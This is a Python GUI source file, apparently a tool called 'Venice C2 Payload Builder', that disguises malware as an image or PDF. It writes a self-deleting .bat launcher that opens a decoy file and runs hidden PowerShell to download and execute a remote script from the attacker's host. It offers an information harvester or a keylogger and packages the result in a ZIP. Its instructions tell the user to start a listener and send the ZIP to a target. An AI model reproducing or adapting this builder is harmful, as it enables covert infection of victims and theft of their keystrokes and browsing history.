import tkinter as tk
from tkinter import filedialog, messagebox, font
import os
import zipfile
import shutil
import socket

# --- GUI Setup ---
window = tk.Tk()
window.title("Venice C2 Payload Builder")
# Window ko center mein laane ke liye
window_width = 650
window_height = 550
screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()
x = (screen_width // 2) - (window_width // 2)
y = (screen_height // 2) - (window_height // 2)
window.geometry(f"{window_width}x{window_height}+{x}+{y}")
window.config(bg="#1a1a1a")
window.resizable(False, False)

# --- Fonts ---
# --- Fonts ---
bold_font = ("Arial", 12, "bold", "italic")
title_font = ("Courier", 22, "bold")
normal_font = ("Arial", 11)
italic_font = ("Arial", 10, "italic") # <-- YE LINE ADD KARO

# --- Banner Frame (Zphisher Style) ---
banner_frame = tk.Frame(window, bg="#0f0f0f", relief=tk.SUNKEN, bd=2)
banner_frame.pack(fill=tk.X, padx=5, pady=5)

banner_title = tk.Label(banner_frame, text="   VENICE C2 TOOL   ", font=title_font, fg="#00ff00", bg="#0f0f0f")
banner_title.pack(pady=10)

banner_subtitle = tk.Label(banner_frame, text="--- Create Advanced Payloads with Ease ---", font=bold_font, fg="#ffffff", bg="#0f0f0f")
banner_subtitle.pack(pady=(0, 10))


# --- Main Frame ---
main_frame = tk.Frame(window, bg="#1a1a1a")
main_frame.pack(pady=10, padx=20, fill=tk.BOTH, expand=True)

# --- Variables ---
payload_choice = tk.IntVar(value=1) # Default to first option
selected_file_path = tk.StringVar()

# --- Functions ---
def get_kali_ip():
    """Get the local IP address of the machine."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1" # Fallback

def select_file():
    filepath = filedialog.askopenfilename(
        title="Select an Image or PDF",
        filetypes=[("Image files", "*.jpg *.jpeg *.png"), ("PDF files", "*.pdf")]
    )
    if filepath:
        selected_file_path.set(filepath)
        file_label.config(text=f"✅ Selected: {os.path.basename(filepath)}", fg="#00ff00")

def update_script_ip(script_path, ip):
    """Replace placeholder IP in the PowerShell script with the actual IP."""
    with open(script_path, 'r') as f:
        content = f.read()
    new_content = content.replace("10.46.70.32", ip)
    with open(script_path, 'w') as f:
        f.write(new_content)

def generate_payload():
    file_path = selected_file_path.get()
    if not file_path:
        messagebox.showerror("Error", "Please select an image or PDF file first!", parent=window)
        return

    choice = payload_choice.get()
    if choice not in [1, 2]:
        messagebox.showerror("Error", "Please choose a payload option!", parent=window)
        return

    kali_ip = get_kali_ip()
    if kali_ip == "127.0.0.1":
         messagebox.showwarning("Warning", f"Could not determine your public IP. Using {kali_ip}. Ensure your listener is set up correctly!", parent=window)


    try:
        # Define paths
        output_dir = os.path.dirname(file_path)
        original_filename = os.path.basename(file_path)
        payload_name = os.path.splitext(original_filename)[0]
        output_zip_path = os.path.join(output_dir, f"{payload_name}_payload.zip")
        temp_dir = "temp_build_dir"
        
        # Clean up old temp dir if it exists
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        os.makedirs(temp_dir)

        # Determine which script to use
        if choice == 1:
            script_name = "info_harvester.ps1"
            listener_port = 4444
        else:
            script_name = "keylogger.ps1"
            listener_port = 4445
        
        # --- Create a simple .bat launcher ---
        # This is more reliable than a complex .lnk shortcut on Linux.
        # The .bat will open the real file and then run the PowerShell command.
        
        # 1. Copy the original file to temp dir with a hidden name
        hidden_file_name = f"~{original_filename}"
        shutil.copy(file_path, os.path.join(temp_dir, hidden_file_name))

        # 2. Create the .bat file
        bat_file_path = os.path.join(temp_dir, f"{payload_name}.bat")
        
        # Command to run the PowerShell script from a web server
        # This is stealthier than embedding the whole script.
        web_script_url = f"http://{kali_ip}:8000/{script_name}"
        ps_command = f'powershell.exe -WindowStyle Hidden -c "IEX (New-Object System.Net.WebClient).DownloadString(\'{web_script_url}\')"'
        
        with open(bat_file_path, "w") as f:
            f.write(f'@echo off\nSTART "" "{hidden_file_name}"\n{ps_command}\nDEL "%~f0"') # Deletes the .bat after running

        # 3. Create the ZIP archive
        with zipfile.ZipFile(output_zip_path, 'w') as zipf:
            zipf.write(bat_file_path, os.path.basename(bat_file_path))
            zipf.write(os.path.join(temp_dir, hidden_file_name), original_filename) # Add with original name

        # Cleanup temp dir
        shutil.rmtree(temp_dir)

        messagebox.showinfo(
            "Success!",
            f"✅ Payload created successfully!\n\n"
            f"Saved as: {output_zip_path}\n\n"
            f"--- INSTRUCTIONS ---\n"
            f"1. Start your listener: python3 listener.py -i {kali_ip} -p {listener_port}\n"
            f"2. Start the payload server: python3 serve_payloads.py\n"
            f"3. Send the ZIP file to the target.",
            parent=window
        )

    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {e}", parent=window)


# --- GUI Widgets ---

# File Selection
file_frame = tk.LabelFrame(main_frame, text="1. Select File", font=bold_font, fg="#00ff00", bg="#1a1a1a", relief=tk.GROOVE, bd=2)
file_frame.pack(fill=tk.X, pady=10, padx=10)

file_label = tk.Label(file_frame, text="No file selected.", font=normal_font, fg="#ff4444", bg="#1a1a1a")
file_label.pack(pady=10)

select_button = tk.Button(file_frame, text="📂 Choose Image or PDF", font=normal_font, bg="#3498db", fg="white", command=select_file)
select_button.pack(pady=5, padx=10, fill=tk.X)


# Payload Selection
payload_frame = tk.LabelFrame(main_frame, text="2. Choose Payload", font=bold_font, fg="#00ff00", bg="#1a1a1a", relief=tk.GROOVE, bd=2)
payload_frame.pack(fill=tk.X, pady=10, padx=10)

tk.Radiobutton(
    payload_frame, text="🖥️  Virus 1: System Info Harvester\n(Steals OS, RAM, Battery details)",
    variable=payload_choice, value=1, font=normal_font, fg="white", bg="#1a1a1a", selectcolor="#2c2c2c",
    activebackground="#1a1a1a", activeforeground="white"
).pack(anchor=tk.W, padx=20, pady=5)

tk.Radiobutton(
    payload_frame, text="⌨️  Virus 2: Keylogger & History\n(Sends keystrokes & search history every 60s)",
    variable=payload_choice, value=2, font=normal_font, fg="white", bg="#1a1a1a", selectcolor="#2c2c2c",
    activebackground="#1a1a1a", activeforeground="white"
).pack(anchor=tk.W, padx=20, pady=5)


# Generate Button
generate_button = tk.Button(main_frame, text="🚀 GENERATE PAYLOAD 🚀", font=("Arial", 14, "bold"), bg="#e74c3c", fg="white", command=generate_payload)
generate_button.pack(pady=20, ipady=10, fill=tk.X, padx=10)
# --- Footer Frame ---
footer_frame = tk.Frame(window, bg="#0f0f0f", relief=tk.RAISED, bd=1)
footer_frame.pack(fill=tk.X, side=tk.BOTTOM, padx=5, pady=5)

footer_label = tk.Label(
    footer_frame,
    text="Created with ❤️ by Venice | For Educational Use Only",
    font=italic_font,
    fg="#888888",
    bg="#0f0f0f"
)
footer_label.pack(pady=5)

# --- Start the GUI ---
# Ye line sirf GUI start karti hai, terminal pe kuch print nahi karta.
window.mainloop()
